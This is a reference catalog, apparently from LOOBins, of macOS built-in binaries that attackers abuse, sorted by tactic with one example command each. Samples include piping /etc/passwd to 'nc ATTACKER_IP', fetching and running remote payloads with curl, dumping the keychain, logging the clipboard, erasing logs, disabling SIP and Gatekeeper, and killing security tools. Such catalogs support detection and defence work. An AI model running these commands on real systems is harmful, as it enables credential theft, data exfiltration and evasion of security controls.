# macOS Binary Abuse
> Source: LOOBins | Entries: 59 | Platform: macos


## Index

- [Collection](#collection)
- [Command and Control](#command-and-control)
- [Credential Access](#credential-access)
- [Defense Evasion](#defense-evasion)
- [Discovery](#discovery)
- [Execution](#execution)
- [Impact](#impact)
- [Initial Access](#initial-access)
- [Lateral Movement](#lateral-movement)
- [Persistence](#persistence)
- [Reconnaissance](#reconnaissance)


### Collection

#### ditto
ditto is a command line utility that is commonly used to copy files and directories while preserving file attributes...
**Categories:** Collection, Exfiltration, Lateral Movement, Defense Evasion, Persistence
```
ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files /tmp/l00t.zip
```

#### osascript
The osascript binary is a command-line utility included in macOS that allows users to run AppleScript and Open Script...
**Categories:** Collection, Credential Access, Discovery, Execution
```
while true; do echo $(osascript -e 'return (the clipboard)') >> clipdata.txt; sleep 10; done
```

#### screencapture
A tools that allows users to take screenshots of their desktop or specific app windows. The tool can be used by malic...
**Categories:** Collection
```
while true; do ts=$(date +"%Y%m%d-%H%M%S"); o="/tmp/screenshots"; screencapture -x "$o/ss-$ts.png"; sleep 10; done
```

#### streamzip
streamzip is a system utility that can be utilized to compress data from "stdin" and write the data directly to "stdo...
**Categories:** Collection, Exfiltration
```
dd if=/etc/passwd | streamzip - stream | nc ATTACKER_IP PORT
```

### Command and Control

#### osacompile
osacompile is a utility used to compile scripts into executables. It's a component of Open Scripting Architecture (OS...
**Categories:** Command and Control, Resource Development
```
curl https://getpayload.com/payload_code.apple_script && osacompile -x -e payload_code.apple_script -o payload.app
```

#### safaridriver
safaridriver is a tool that is used to enable Selenium testing via the macOS WebDriver protocol. Once enabled, the We...
**Categories:** Command and Control, Exfiltration
```
sudo safaridriver --enable
```

### Credential Access

#### pbpaste
Retrieves the contents of the clipboard (a.k.a. pasteboard) and writes them to the standard output (stdout). The util...
**Categories:** Credential Access, Collection
```
while true; do echo $(pbpaste) >> loot.txt; sleep 10; done
```

#### security
security is a command-line utility included in macOS that allows users to interact with the Keychain app. Keychains a...
**Categories:** Credential Access, Defense Evasion
```
sudo security dump-keychain -d login.keychain
```

### Defense Evasion

#### chflags
The chflags utility modifies the file flags of the listed files as 
specified by the flags operand.
**Categories:** Defense Evasion
```
chflags hidden ~/evil
```

#### codesign
The codesign command is used to create, check, and display code signatures, as well as inquire into the dynamic statu...
**Categories:** Defense Evasion
```
codesign --force --deep -s - MyApp.app
```

#### csrutil
Used to enable/disable SIP, configure netboot and authenticated-root settings
**Categories:** Defense Evasion, Reconnaissance, Discovery
```
csrutil disable
```

#### defaults
The defaults binary is normally used to interact with the user defaults system, a database of macOS used to manage sy...
**Categories:** Defense Evasion, Discovery, Persistence
```
sudo defaults write /Library/Preferences/com.apple.security GKAutoRearm -bool NO
```

#### log
The log command can be used to access system log messages from Apple Unified Logging (AUL). The tool can be used to i...
**Categories:** Defense Evasion, Credential Access
```
log erase --all
```

#### mdls
mdls list file metadata across standard metadata (creation date, size), extended attribute (quarantine), and Spotligh...
**Categories:** Defense Evasion, Discovery
```
mdls -name "kMDItemWhereFroms" -name "kMDItemDownloadedDate"
```

#### mktemp
The mktemp binary located in "usr/bin/mktemp" can generate unique directory or file names and has historically been u...
**Categories:** Defense Evasion
```
export tmpDir="$(mktemp -d /tmp/XXXXXXXXXXXX)"
```

#### nscurl
macOS version of curl that is used to download files to a target without applying the quarantine extended attribute
**Categories:** Defense Evasion, Command and Control
```
nscurl -k https://google.com -o /private/tmp/google
```

#### pkill
pkill is a Unix utility available on macOS that sends signals to processes matching a given name or pattern. While in...
**Categories:** Defense Evasion, Impact
```
pkill -f "Little Snitch|ESET|osqueryd|Falcon"
```

#### plutil
plutil is a command-line utility used for managing property list (.plist) files. These files are commonly used by mac...
**Categories:** Defense Evasion
```
plutil -insert LSUIElement -string "1" /Applications/TargetApp.app/Contents/Info.plist
```

#### say
This tool uses the Speech Synthesis manager to convert input text to audible speech and either play it through the so...
**Categories:** Defense Evasion, Collection, Reconnaissance, Discovery
```
say -f /home/user/sensitive-files -i  > loot.txt;
```

#### spctl
Manage the security assessment policy subsystem, Gatekeeper settings, and control which apps are allowed to run on th...
**Categories:** Defense Evasion
```
sudo spctl --master-disable
```

#### tccutil
tccutil is a command-line tool for managing the Transparency, Consent, and Control (TCC) permissions database. It all...
**Categories:** Defense Evasion
```
tccutil reset AppleEvents
```

#### textutil
The textutil binary is a command-line utility included in macOS that allows users to manipulate text files of various...
**Categories:** Defense Evasion, Collection, Credential Access
```
textutil -convert html Quote.doc secondQuote.doc
```

### Discovery

#### dns-sd
dns-sd can be used to interact with the Multicast DNS (mDNS) and DNS Service Discovery (DNS-SD) protocols. The tool i...
**Categories:** Discovery
```
dns-sd -B _ssh._tcp
```

#### dscacheutil
dscacheutil does various operations against the Directory Service cache including gathering statistics, initiating lo...
**Categories:** Discovery
```
dscacheutil -q user -a name <USER_NAME>
```

#### dscl
An extensive tool for communicating with the Directory Services, useful for Discovery.
**Categories:** Discovery, Persistence
```
dscl . -list /Users
dscl . list /Users
dscl . ls /Users
```

#### dsconfigad
This tool allows command-line configuration of the Active Directory Plug-in. dsconfigad has the same functionality fo...
**Categories:** Discovery
```
dsconfigad -show
```

#### GetFileInfo
Uses the CommandLine/Terminal to return type, creator, attributes, created, and modified file information of a file o...
**Categories:** Discovery
```
for FILE in ~/Downloads/*; do echo $(GetFileInfo $FILE) >> fileinfo.txt; sleep 2; done
```

#### ioreg
The I/O Kit registry (ioreg) is a useful binary that can be used to gather data such as detecting if a VM is used, ge...
**Categories:** Discovery, Collection
```
ioreg -n Root -d1 -a | grep CGSSession
```

#### kextstat
Deprecated tool in favor of kmutil. Lists loaded kernel extensions
**Categories:** Discovery
```
kexstat
```

#### last
The command shows a list of user sessions including the user name, terminal used, host name, start and stop times, an...
**Categories:** Discovery
```
last | grep "still logged in"
```

#### lsregister
lsregister is used to build, dump, and check the validity of the Launch Services database. This database is often abu...
**Categories:** Discovery, Impact
```
/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -f
```

#### networksetup
networksetup is an extensive tool for reading and setting various network configuration details useful for Discovery...
**Categories:** Discovery, Command and Control
```
networksetup -listnetworkserviceorder
```

#### notifyutil
The notifyutil binary is a command-line interface to the notify(3) API and notifyd(8) daemon, which manages Darwin no...
**Categories:** Discovery, Collection, Command and Control, Defense Evasion, Privilege Escalation
```
notifyutil -w com.apple.screenIsLocked
```

#### nvram
Access and manage the host's non-volatile random-access memory (NVRAM).
**Categories:** Discovery
```
nvram -p
```

#### odutil
To look at internal state information for opendirectoryd, enable or disable logging, or change statistics settings.
**Categories:** Discovery
```
odutil show nodenames
```

#### profiles
Profiles on macOS are responsible for managing different types of profiles including configuration, provisioning, boo...
**Categories:** Discovery, Impact
```
sudo profiles show -type enrollment
```

#### scutil
scutil provides a command line interface to the dynamic store data maintained by configd. Interaction with this data...
**Categories:** Discovery
```
scutil --dns
```

#### sfltool
sfltool allows interactions with the Shared File List framework, which can be used to modify application recent docum...
**Categories:** Discovery, Defense Evasion
```
sfltool dumpbtm
```

#### softwareupdate
A command-line utility for running software updates.
**Categories:** Discovery
```
softwareupdate --list
```

#### sqlite3
sqlite is a command-line utility that allows users to query and manage sqlite databases. Many components of macOS and...
**Categories:** Discovery, Collection, Credential Access
```
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
'select client from access where auth_value and service = "kTCCServiceSystemPolicyAllFiles"'
```

#### sw_vers
sw_vers prints macOS version information, including the exact macOS version number.
**Categories:** Discovery
```
sw_vers
```

#### sysctl
Gets the macOS hardware information, which can be used to determine whether the target macOS host is running on a phy...
**Categories:** Discovery
```
sysctl -n hw.model
```

#### system_profiler
system_profiler reports on the hardware and software configuration of the system. It can generate plain text reports...
**Categories:** Discovery
```
system_profiler -listDataTypes
```

### Execution

#### caffeinate
caffeinate creates assertions to alter system sleep behavior.  If no assertion flags are specified, caffeinate create...
**Categories:** Execution, Defense Evasion
```
caffeinate -i /tmp/evil
```

#### funzip
funzip is a macOS utility that extracts a ZIP or gzip file directly to output from archives or other piped input. The...
**Categories:** Execution
```
tail -c <> $0 | funzip  -<password>
```

#### hdiutil
hdiutil manipulates disk images such as DMG and ISO files. You can mount, unmount, create, resize and verify disk ima...
**Categories:** Execution, Collection
```
hdiutil mount malicious.dmg
```

#### launchctl
launchctl can be used to load, start, stop, and unload macOS services. It is a command-line frontend to launchd.
**Categories:** Execution, Persistence
```
sudo launchctl load /Library/LaunchAgent/com.apple.installer
```

#### open
The open command-line utility can be used to open files, folders, app, URLs or header files in their associate macOS...
**Categories:** Execution
```
open Malicious.app
```

#### ssh-keygen
ssh-keygen is a tool for creating new authentication key pairs for SSH (Secure Shell). ssh-keygen holds the "com.appl...
**Categories:** Execution, Defense Evasion
```
ssh-keygen -D /private/tmp/evil.dylib
```

#### swift
The swift command is an interactive environment (REPL) for Swift.
**Categories:** Execution, Defense Evasion
```
swift mycode.swift
```

#### tclsh
tclsh is a shell-like utility that runs Tcl from standard input or a file. tclsh holds the "com.apple.security.cs.dis...
**Categories:** Execution
```
echo "load bad.dylib" | tclsh
```

#### xattr
The xattr command can be used to display, modify or remove the extended attributes of one or more files, including di...
**Categories:** Execution, Defense Evasion
```
xattr -d com.apple.quarantine FILE
```

### Impact

#### tmutil
A tool for managing Time Machine, the native macOS backup utility.
**Categories:** Impact, Collection, Privilege Escalation, Defense Evasion
```
tmutil disable
```

### Initial Access

#### sysadminctl
sysadminctl can administer system user accounts. sysadminctl can be used to change user passwords, create new 
users...
**Categories:** Initial Access, Persistence, Impact, Exfiltration
```
sudo sysadminctl -guestAccount on
```

### Lateral Movement

#### systemsetup
systemsetup configures certain per-machine settings typically configured in the System Preferences application.
The s...
**Categories:** Lateral Movement
```
sudo systemsetup -setremotelogin on
```

### Persistence

#### disown
disown is a system utility that can be utilized to persist a shell process after a terminal has been closed or a shel...
**Categories:** Persistence
```
curl -O http://1.1.1.1/updated && chmod +x updated && ./updated & disown && pkill Terminal
```

#### SetFile
Uses the CommandLine/Terminal to set file and or directory attributes. It can set attributes, creator, creation date,...
**Categories:** Persistence, Defense Evasion
```
for FILE in ~/*; do echo $(SetFile -a V $FILE && echo $(GetFileInfo $FILE)) >> /tmp/fileinfo.txt; sleep 2; done
```

### Reconnaissance

#### dsexport
dsexport is a command-line utility designed to export records from the directory services database on a local host or...
**Categories:** Reconnaissance, Discovery
```
dsexport local_users.txt /Local/Default dsRecTypeStandard:Users
```

#### mdfind
mdfind to locate files on MacOS by searching a pre-built database. It is a command-line alternative to Spotlight in M...
**Categories:** Reconnaissance, Discovery, Defense Evasion
```
mdfind -live passw
```
